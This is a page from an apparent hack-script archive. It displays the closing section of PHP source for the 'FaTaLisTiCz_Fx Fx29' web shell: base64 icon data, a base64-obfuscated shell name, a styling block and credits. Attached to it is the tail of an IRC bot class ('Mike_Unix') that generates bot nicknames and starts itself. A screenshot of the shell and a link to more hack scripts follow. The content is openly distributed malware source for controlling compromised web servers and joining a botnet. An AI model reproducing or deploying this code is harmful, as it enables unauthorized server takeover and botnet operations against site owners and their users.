<span class="lineno">3327</span> <span class="s1">&#39;CLrcJVCMSesAJJOhY7waAUgWhWljo67rE7FMGGhzYNtnNt48HsJAlgsSzIlovYAxlfShBMVoIQEA&#39;</span><span class="o">.</span>
<span class="lineno">3328</span> <span class="s1">&#39;Ow==&#39;</span><span class="p">,</span>
<span class="lineno">3329</span>   <span class="s2">&quot;ext_txt&quot;</span><span class="o">=&gt;</span>
<span class="lineno">3330</span> <span class="s1">&#39;R0lGODlhCwAQAKIFACoqKqCeoO/z83d2brO2vwAAAAAAAAAAACH5BAHoAwUALAAAAAALABAAAAM5&#39;</span><span class="o">.</span>
<span class="lineno">3331</span> <span class="s1">&#39;CLM8MSBIJwNZJAhNRBdDR3xCCYqkGXppuZrwuVWj21mVJo+jZG812Cv288VWD+KQtQA4m4CCdJoA&#39;</span><span class="o">.</span>
<span class="lineno">3332</span> <span class="s1">&#39;ADs=&#39;</span><span class="p">,</span>
<span class="lineno">3333</span>   <span class="s2">&quot;ext_wri&quot;</span><span class="o">=&gt;</span>
<span class="lineno">3334</span>   <span class="s2">&quot;R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA&quot;</span><span class="o">.</span>
<span class="lineno">3335</span>   <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao&quot;</span><span class="o">.</span>
<span class="lineno">3336</span>   <span class="s2">&quot;a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=&quot;</span><span class="p">,</span>
<span class="lineno">3337</span>   <span class="s2">&quot;ext_xml&quot;</span><span class="o">=&gt;</span>
<span class="lineno">3338</span>   <span class="s2">&quot;R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA&quot;</span><span class="o">.</span>
<span class="lineno">3339</span>   <span class="s2">&quot;gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
<span class="lineno">3340</span>   <span class="s2">&quot;AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx&quot;</span><span class="o">.</span>
<span class="lineno">3341</span>   <span class="s2">&quot;OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ&quot;</span><span class="o">.</span>
<span class="lineno">3342</span>   <span class="s2">&quot;IQA7&quot;</span>
<span class="lineno">3343</span>   <span class="p">);</span>
<span class="lineno">3344</span>   <span class="k">return</span> <span class="nv">$images</span><span class="p">;</span>
<span class="lineno">3345</span> <span class="p">}</span>
<span class="lineno">3346</span> <span class="k">function</span> <span class="nf">sh_name</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s2">&quot;RmFUYUxpc1RpQ3pfRnggRngyOVNoZUxMIHY=&quot;</span><span class="p">)</span><span class="o">.</span><span class="nx">sh_ver</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">3347</span> <span class="k">function</span> <span class="nf">fx29sh_tools</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">3348</span>   <span class="k">echo</span> <span class="s2">&quot;&lt;div class=</span><span class="se">\&quot;</span><span class="s2">barheader</span><span class="se">\&quot;</span><span class="s2">&gt;.: TooLz :.&lt;/div&gt;&quot;</span><span class="p">;</span>
<span class="lineno">3349</span> <span class="p">}</span>
<span class="lineno">3350</span> <span class="k">function</span> <span class="nf">fx29sh_about</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">3351</span>   <span class="k">echo</span> <span class="s2">&quot;&lt;div class=</span><span class="se">\&quot;</span><span class="s2">barheader</span><span class="se">\&quot;</span><span class="s2">&gt;.: Credits :.&lt;/div&gt;&quot;</span><span class="o">.</span>
<span class="lineno">3352</span>        <span class="s2">&quot;Idea, leader &amp; coder: &lt;b&gt;tristram [CCTeaM]&lt;/b&gt;&lt;br&gt;&quot;</span><span class="o">.</span>
<span class="lineno">3353</span>        <span class="s2">&quot;Beta-tester &amp; tips: &lt;b&gt;NukLeoN [AnTiSh@Re tEaM]&lt;/b&gt;&lt;br&gt;&quot;</span><span class="o">.</span>
<span class="lineno">3354</span>        <span class="s2">&quot;Re-coder, Designer, Windows Fix, PHP Mailer &amp; PHP Filesystem: &lt;b&gt;FaTaLisTiCz_Fx [FeeLCoMz CoMMuNiTy]&lt;/b&gt;&lt;br&gt;&quot;</span><span class="o">.</span>
<span class="lineno">3355</span>        <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="o">.</span>
<span class="lineno">3356</span>        <span class="s2">&quot;Please report bugs to &lt;a href=</span><span class="se">\&quot;</span><span class="s2">mailto:yankeemoore55@gmail.com</span><span class="se">\&quot;</span><span class="s2">&gt;FaTaLisTiCz_Fx&lt;/a&gt;&lt;/b&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">3357</span> <span class="p">}</span>
<span class="lineno">3358</span> <span class="k">function</span> <span class="nf">html_style</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">3359</span> <span class="nv">$style</span> <span class="o">=</span> <span class="s1">&#39;&lt;html&gt;</span>
<span class="lineno">3360</span> <span class="s1">&lt;head&gt;</span>
<span class="lineno">3361</span> <span class="s1">    &lt;style&gt;</span>
<span class="lineno">3362</span> <span class="s1">        table {width: 100%;border-collapse: collapse;}</span>
<span class="lineno">3363</span> <span class="s1">        #main, #maininfo {width: 900px;}</span>
<span class="lineno">3364</span> <span class="s1">        body, table, input, select, option, .info</span>
<span class="lineno">3365</span> <span class="s1">        {</span>
<span class="lineno">3366</span> <span class="s1">            font: 8pt tahoma;</span>
<span class="lineno">3367</span> <span class="s1">        }</span>
<span class="lineno">3368</span> <span class="s1">        .footer {font: 7pt tahoma;}</span>
<span class="lineno">3369</span> <span class="s1">        textarea, .code</span>
<span class="lineno">3370</span> <span class="s1">        {</span>
<span class="lineno">3371</span> <span class="s1">            font: 8pt Courier New;</span>
<span class="lineno">3372</span> <span class="s1">            color: #dedbde;</span>
<span class="lineno">3373</span> <span class="s1">            border: 1px solid #666666;</span>
<span class="lineno">3374</span> <span class="s1">        }</span>
<span class="lineno">3375</span> <span class="s1">        img {border: 0;}</span>
<span class="lineno">3376</span> <span class="s1">        #maininfo img {width: 16;height: 16;}</span>
<span class="lineno">3377</span> <span class="s1">        input, select, option {border: 1px solid #606060;}</span>
<span class="lineno">3378</span> <span class="s1">        #maininfo, td, th {border: 1px solid #3F3F3F;}</span>
<span class="lineno">3379</span> <span class="s1">        a {color: #5B5BFF;text-decoration: none;}</span>
<span class="lineno">3380</span> <span class="s1">        #pagebar a, .barheader a {color: #00FF00;}</span>
<span class="lineno">3381</span> <span class="s1">        a:hover, #pagebar a:hover {color: #3366FF;}</span>
<span class="lineno">3382</span> <span class="s1">        .on {color: #00FF00;}</span>
<span class="lineno">3383</span> <span class="s1">        .off, .errmsg {color: #FF0000;}</span>
<span class="lineno">3384</span> <span class="s1">        body, table, input, select, option {color : #EEEEEE;}</span>
<span class="lineno">3385</span> <span class="s1">        .info th {color: #969696;width: 13%;}</span>
<span class="lineno">3386</span> <span class="s1">        .shell {font-size: 12;color: #C0C0C0;border: 0;}</span>
<span class="lineno">3387</span> <span class="s1">        #pagebar a, .barheader, .errmsg, .on, .off</span>
<span class="lineno">3388</span> <span class="s1">        {</span>
<span class="lineno">3389</span> <span class="s1">            font-weight: bold;</span>
<span class="lineno">3390</span> <span class="s1">        }</span>
<span class="lineno">3391</span> <span class="s1">        p, form, .info, .info td, .info th, .explorer *</span>
<span class="lineno">3392</span> <span class="s1">        {</span>
<span class="lineno">3393</span> <span class="s1">            margin: 0;</span>
<span class="lineno">3394</span> <span class="s1">        }</span>
<span class="lineno">3395</span> <span class="s1">        input, #maininfo {margin: 3px;}</span>
<span class="lineno">3396</span> <span class="s1">        #mainpanel input, #mainpanel select</span>
<span class="lineno">3397</span> <span class="s1">        {</span>
<span class="lineno">3398</span> <span class="s1">          margin: 0px 2px 0px 2px;</span>
<span class="lineno">3399</span> <span class="s1">        }</span>
<span class="lineno">3400</span> <span class="s1">        #maininfo table, select {margin: 2px 0px 2px 0px;}</span>
<span class="lineno">3401</span> <span class="s1">        #pagebar, .bartitle, #mainpanel {background: #474747;}</span>
<span class="lineno">3402</span> <span class="s1">        body, textarea, .shell, input, select, option</span>
<span class="lineno">3403</span> <span class="s1">        {</span>
<span class="lineno">3404</span> <span class="s1">            background: #000000;</span>
<span class="lineno">3405</span> <span class="s1">        }</span>
<span class="lineno">3406</span> <span class="s1">        .info, .info th, .info td, input[type=&quot;label&quot;]</span>
<span class="lineno">3407</span> <span class="s1">        {</span>
<span class="lineno">3408</span> <span class="s1">            background: transparent;</span>
<span class="lineno">3409</span> <span class="s1">            border: 0;</span>
<span class="lineno">3410</span> <span class="s1">        }</span>
<span class="lineno">3411</span> <span class="s1">        #pagebar td, #mainpanel td, #mainpanel th, .contents th, .explorer td</span>
<span class="lineno">3412</span> <span class="s1">        {</span>
<span class="lineno">3413</span> <span class="s1">            border-left: 0;</span>
<span class="lineno">3414</span> <span class="s1">            border-right: 0;</span>
<span class="lineno">3415</span> <span class="s1">        }</span>
<span class="lineno">3416</span> <span class="s1">        .bartitle, .barheader, input[type=&quot;submit&quot;], input[type=&quot;button&quot;], input[type=&quot;reset&quot;]</span>
<span class="lineno">3417</span> <span class="s1">        {</span>
<span class="lineno">3418</span> <span class="s1">            color: #D0D0D0;</span>
<span class="lineno">3419</span> <span class="s1">            background: #3F3F3F;</span>
<span class="lineno">3420</span> <span class="s1">            border: 1px solid #202020;</span>
<span class="lineno">3421</span> <span class="s1">            border-top: 1px solid #505050;</span>
<span class="lineno">3422</span> <span class="s1">            border-left: 1px solid #505050;</span>
<span class="lineno">3423</span> <span class="s1">        }</span>
<span class="lineno">3424</span> <span class="s1">        input[type=&quot;submit&quot;]:hover, input[type=&quot;button&quot;]:hover, input[type=&quot;reset&quot;]:hover</span>
<span class="lineno">3425</span> <span class="s1">        {</span>
<span class="lineno">3426</span> <span class="s1">            color: #00FF00;</span>
<span class="lineno">3427</span> <span class="s1">            background: #333333;</span>
<span class="lineno">3428</span> <span class="s1">        }</span>
<span class="lineno">3429</span> <span class="s1">        td, .info th {vertical-align: top;}</span>
<span class="lineno">3430</span> <span class="s1">        .explorer td {vertical-align: middle;}</span>
<span class="lineno">3431</span> <span class="s1">        .fleft {float: left;}</span>
<span class="lineno">3432</span> <span class="s1">        .fright {float: right;}</span>
<span class="lineno">3433</span> <span class="s1">        .code, .fleft, .info th {text-align: left;}</span>
<span class="lineno">3434</span> <span class="s1">        .fright, input[type=&quot;label&quot;], #mainpanel th, .contents th</span>
<span class="lineno">3435</span> <span class="s1">        {</span>
<span class="lineno">3436</span> <span class="s1">            text-align: right;</span>
<span class="lineno">3437</span> <span class="s1">        }</span>
<span class="lineno">3438</span> <span class="s1">        #maininfo, .bartitle, .quicklaunch, .quicklaunch a, .barheader, th</span>
<span class="lineno">3439</span> <span class="s1">        {</span>
<span class="lineno">3440</span> <span class="s1">            text-align: center;</span>
<span class="lineno">3441</span> <span class="s1">        }</span>
<span class="lineno">3442</span> <span class="s1">        td, textarea, input[type=&quot;text&quot;], .bartitle, .barheader, .code, th</span>
<span class="lineno">3443</span> <span class="s1">        {</span>
<span class="lineno">3444</span> <span class="s1">            padding: 3px;</span>
<span class="lineno">3445</span> <span class="s1">        }</span>
<span class="lineno">3446</span> <span class="s1">        .info th, .info td {padding: 0px 2px 0px 2px;}</span>
<span class="lineno">3447</span> <span class="s1">        .quicklaunch a {padding : 0px 5px 0px 5px;}</span>
<span class="lineno">3448</span> <span class="s1">    &lt;/style&gt;</span>
<span class="lineno">3449</span> <span class="s1">    &lt;title&gt;&#39;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; - &#39;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&lt;/title&gt;</span>
<span class="lineno">3450</span> <span class="s1">&lt;/head&gt;</span>
<span class="lineno">3451</span> <span class="s1">&lt;body&gt;&lt;center&gt;</span>
<span class="lineno">3452</span> <span class="s1">&#39;</span><span class="p">;</span>
<span class="lineno">3453</span> <span class="k">return</span> <span class="nv">$style</span><span class="p">;</span>
<span class="lineno">3454</span> <span class="p">};</span>
<span class="lineno">3455</span> <span class="k">function</span> <span class="nf">html_header</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;br&gt;.: No System is Perfectly Safe :.&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">3456</span> <span class="k">function</span> <span class="nf">html_footer</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&amp;copy; 2008 By FaTaLisTiCz_Fx, FeeLCoMz Community. Generated: &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nx">getmicrotime</span><span class="p">()</span><span class="o">-</span><span class="nx">starttime</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; seconds&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">3457</span> <span class="k">function</span> <span class="nf">disp_error</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;div class=errmsg&gt;</span><span class="si">$msg</span><span class="s2">&lt;/div&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">3458</span> <span class="k">function</span> <span class="nf">srv_info</span><span class="p">(</span><span class="nv">$title</span><span class="p">,</span><span class="nv">$contents</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t\t</span><span class="s2">&lt;tr&gt;&lt;th&gt;</span><span class="si">$title</span><span class="s2">&lt;/th&gt;&lt;td&gt;:&lt;/td&gt;&lt;td&gt;</span><span class="si">$contents</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">3459</span> <span class="k">function</span> <span class="nf">srv_software</span><span class="p">(</span><span class="nv">$surl</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3460</span>   <span class="nv">$srv_software</span> <span class="o">=</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_SOFTWARE&quot;</span><span class="p">);</span>
<span class="lineno">3461</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">(),</span><span class="nv">$srv_software</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$srv_software</span> <span class="o">.=</span> <span class="s2">&quot;. PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno">3462</span>   <span class="k">return</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">(),</span><span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=phpinfo</span><span class="se">\&quot;</span><span class="s2"> target=</span><span class="se">\&quot;</span><span class="s2">_blank</span><span class="se">\&quot;</span><span class="s2">&gt;PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt;&quot;</span><span class="p">,</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$srv_software</span><span class="p">));</span>
<span class="lineno">3463</span> <span class="p">}</span>
<span class="lineno">3464</span> <span class="c1">####################################</span>
<span class="lineno">3465</span> <span class="c1">###[ END OF FUNCTIONS ]###</span>
<span class="lineno">3466</span> <span class="c1">####################################</span>
<span class="lineno">3467</span> <span class="nb">chdir</span><span class="p">(</span><span class="nv">$lastdir</span><span class="p">);</span> <span class="nx">fx29shexit</span><span class="p">();</span>
<span class="lineno">3468</span> <span class="c1">#######################################</span>
<span class="lineno">3469</span> <span class="c1">###[ FeeLCoMz Community ]###</span>
<span class="lineno">3470</span> <span class="c1">#######################################</span>
<span class="lineno">3471</span> <span class="cp">?&gt;</span><span class="x">         }</span>
<span class="lineno">3472</span> 
<span class="lineno">3473</span> <span class="x">         function busk_nick()</span>
<span class="lineno">3474</span> 
<span class="lineno">3475</span> <span class="x">         {</span>
<span class="lineno">3476</span> 
<span class="lineno">3477</span> <span class="x">            $prefix .= &quot;[RooT|LinuX|&quot;;</span>
<span class="lineno">3478</span> 
<span class="lineno">3479</span> <span class="x">            $random_number = &quot;&quot;;</span>
<span class="lineno">3480</span> 
<span class="lineno">3481</span> <span class="x">            for( $i = 0; $i &lt; $this-&gt;config[ &#39;maxrand&#39; ]; $i++ )</span>
<span class="lineno">3482</span> 
<span class="lineno">3483</span> <span class="x">            {</span>
<span class="lineno">3484</span> 
<span class="lineno">3485</span> <span class="x">                $random_number .= mt_rand( 0, 9 );</span>
<span class="lineno">3486</span> 
<span class="lineno">3487</span> <span class="x">            }</span>
<span class="lineno">3488</span> <span class="x">            $this-&gt;nick = sprintf( $prefix.$this-&gt;config[ &#39;nickform2&#39; ], $random_number );</span>
<span class="lineno">3489</span> 
<span class="lineno">3490</span> <span class="x">            $this-&gt;send(&quot;NICK &quot;.$this-&gt;nick);</span>
<span class="lineno">3491</span> 
<span class="lineno">3492</span> <span class="x">         }</span>
<span class="lineno">3493</span> 
<span class="lineno">3494</span> <span class="x">         function nzm_nick()</span>
<span class="lineno">3495</span> 
<span class="lineno">3496</span> <span class="x">         {</span>
<span class="lineno">3497</span> 
<span class="lineno">3498</span> <span class="x">            $prefix .= &quot;[USA|&quot;;</span>
<span class="lineno">3499</span> 
<span class="lineno">3500</span> <span class="x">            $random_number = &quot;&quot;;</span>
<span class="lineno">3501</span> 
<span class="lineno">3502</span> <span class="x">            for( $i = 0; $i &lt; $this-&gt;config[ &#39;maxrand&#39; ]; $i++ )</span>
<span class="lineno">3503</span> 
<span class="lineno">3504</span> <span class="x">            {</span>
<span class="lineno">3505</span> 
<span class="lineno">3506</span> <span class="x">                $random_number .= mt_rand( 0, 9 );</span>
<span class="lineno">3507</span> 
<span class="lineno">3508</span> <span class="x">            }</span>
<span class="lineno">3509</span> 
<span class="lineno">3510</span> <span class="x">            $ffffu = &quot;$this-&gt;config[ &#39;prfix&#39; ]&quot;;</span>
<span class="lineno">3511</span> 
<span class="lineno">3512</span> <span class="x">            $this-&gt;nick = sprintf( $prefix.$this-&gt;config[&#39;prfix&#39;], $random_number );</span>
<span class="lineno">3513</span> 
<span class="lineno">3514</span> <span class="x">            $this-&gt;send(&quot;NICK &quot;.$this-&gt;nick);</span>
<span class="lineno">3515</span> 
<span class="lineno">3516</span> <span class="x">         }</span>
<span class="lineno">3517</span> <span class="x">        function parse_url_s( $url )</span>
<span class="lineno">3518</span> 
<span class="lineno">3519</span> <span class="x">        {</span>
<span class="lineno">3520</span> 
<span class="lineno">3521</span> <span class="x">            $URLpcs = ( parse_url( $url ) );</span>
<span class="lineno">3522</span> 
<span class="lineno">3523</span> <span class="x">            $PathPcs = explode( &quot;/&quot;, $URLpcs[&#39;path&#39;] );</span>
<span class="lineno">3524</span> 
<span class="lineno">3525</span> <span class="x">            $URLpcs[&#39;file&#39;] = end( $PathPcs );</span>
<span class="lineno">3526</span> 
<span class="lineno">3527</span> <span class="x">            unset( $PathPcs[ key( $PathPcs ) ] );</span>
<span class="lineno">3528</span> 
<span class="lineno">3529</span> <span class="x">            $URLpcs[&#39;dir&#39;] = implode(&quot;/&quot;,$PathPcs);</span>
<span class="lineno">3530</span> <span class="x">            $fileext = explode( &#39;.&#39;, $URLpcs[&#39;file&#39;] );</span>
<span class="lineno">3531</span> <span class="x">            if(count($fileext))</span>
<span class="lineno">3532</span> 
<span class="lineno">3533</span> <span class="x">            {</span>
<span class="lineno">3534</span> 
<span class="lineno">3535</span> <span class="x">                $URLpcs[&#39;file_ext&#39;] = $fileext[ count( $fileext ) - 1 ];</span>
<span class="lineno">3536</span> 
<span class="lineno">3537</span> <span class="x">            }</span>
<span class="lineno">3538</span> <span class="x">            return ($URLpcs);</span>
<span class="lineno">3539</span> 
<span class="lineno">3540</span> <span class="x">        }</span>
<span class="lineno">3541</span> 
<span class="lineno">3542</span> <span class="x">    }</span>
<span class="lineno">3543</span> <span class="x">    $bot = new Mike_Unix;</span>
<span class="lineno">3544</span> 
<span class="lineno">3545</span> <span class="x">    $bot-&gt;start();</span>
<span class="lineno">3546</span> <span class="x">?&gt;</span></code></pre></div>

<h3>FaTaLisTiCz_Fx Fx29 Shell Screenshot</h3>

<p><a href="//wp-content/uploads/2014/01/FX.png"><img src="//wp-content/uploads/2014/01/FX-1024x499.png" alt="FaTaLisTiCz_Fx Shell screenshot" width="604" height="294" class="aligncenter size-large wp-image-329" /></a></p>



        </section>

        <aside id="sidebar">
          <a href="//upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="//scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
